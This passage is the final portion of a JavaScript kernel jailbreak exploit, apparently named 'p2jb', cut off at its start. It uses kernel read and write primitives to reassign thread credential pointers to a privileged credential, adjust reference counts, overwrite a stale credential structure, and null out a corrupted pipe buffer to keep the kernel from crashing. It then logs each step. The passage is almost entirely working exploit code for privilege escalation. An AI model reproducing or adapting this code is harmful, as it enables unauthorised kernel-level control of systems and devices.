                            break;
                        }
                        const tu = S.kread64(td + TD_UCRED_OFF);
                        if (tu !== B && (tu >> 48n) === 0xFFFFn) {
                            S.kwrite64(td + TD_UCRED_OFF, B);
                            migrated_tcreds.add(toHex(tu));
                            td_migrated++;
                        }
                        td = S.kread64(td + 0x10n);
                    }
                }

                await ulog("post-jb migrate: " + td_migrated + " threads td_ucred -> B " +
                    "(" + migrated_tcreds.size + " distinct cred kptrs replaced)");

                const total = fd_migrated + td_migrated;

                if (total > 0) {
                    const rc_old = Number(S.kread32(B) & 0xFFFFFFFFn);
                    S.kwrite32(B, rc_old + total);
                    await ulog("post-jb migrate: cr_ref(B) " +
                        ("0x" + rc_old.toString(16)) + " -> " +
                        ("0x" + (rc_old + total).toString(16)) +
                        " (+" + total + ")");
                } else {
                    await ulog("post-jb migrate: nothing to migrate (all already on B)");
                }
            }
        } catch (e) {
            await ulog("post-jb migrate: failed: " + e.message +
                " (jailbreak unaffected, close-KP may still fire)");
        }

        try {
            S.iov_ws.terminate();
            S.uio_read_ws.terminate();
            S.uio_write_ws.terminate();
            await js_sleep(200);
            await ulog("post-jb: 12 iov/uio workers terminated (thr_exit)");
        } catch (e) {
            await ulog("post-jb: worker terminate failed: " + e.message +
                " (jailbreak unaffected)");
        }

        try {
            const A = S.ucred_A || 0n;
            const B = S.proc_ucred;

            if (A === 0n || (A >> 48n) !== 0xFFFFn) {
                await ulog("post-jb pin: A invalid (" + toHex(A) + "), skip");
            } else if (B === 0n || (B >> 48n) !== 0xFFFFn) {
                await ulog("post-jb pin: B invalid (" + toHex(B) + "), skip");
            } else if (A === B) {
                await ulog("post-jb pin: A == B (unexpected), skip");
            } else {
                const PIN_REFS = 0x10000000;
                const buf = malloc(UCRED_SIZE);

                S.kread(buf, B, UCRED_SIZE);
                const old_A_ref = (S.kread32(A) & 0xFFFFFFFFn);
                write32(buf, BigInt(PIN_REFS));
                S.kwrite(A, buf, UCRED_SIZE);

                const new_A_ref = (S.kread32(A) & 0xFFFFFFFFn);
                if (Number(new_A_ref) === PIN_REFS) {
                    await ulog("post-jb pin: A=" + toHex(A) +
                        " overwritten with B-clone, cr_ref " +
                        toHex(old_A_ref) + " -> 0x" + PIN_REFS.toString(16) +
                        " (stale freelist consumers now see safe ucred)");
                } else {
                    await ulog("post-jb pin: VERIFY FAILED, cr_ref(A)=" +
                        toHex(new_A_ref) + " (expected 0x" +
                        PIN_REFS.toString(16) + ")");
                }
            }
        } catch (e) {
            await ulog("post-jb pin: failed: " + e.message +
                " (jailbreak unaffected, close-KP may still fire)");
        }

        try {
            const buf_before = S.kread64(S.master_pipe_data + 0x10n);
            S.kwrite64(S.master_pipe_data + 0x10n, 0n);
            
            await ulog("post-jb: master.pipe_buffer.buffer NULL'd " +
                "(was " + toHex(buf_before) + " = victim_pipe_data, " +
                "kernel free-path will now skip vm_map_remove)");
        } catch (e) {
            await ulog("post-jb: pipe_buffer restore failed: " + e.message +
                " (jailbreak unaffected)");
        }

        pin_to_core(S.orig_main_core);
        await ulog("restored main thread to core " + S.orig_main_core);

        await ulog("=== p2jb complete ===");

    } catch (e) {
        try { await log("p2jb FATAL: " + e.message); } catch (_) { }
        try { send_notification("p2jb FAILED: " + e.message); } catch (_) { }
    }
})();
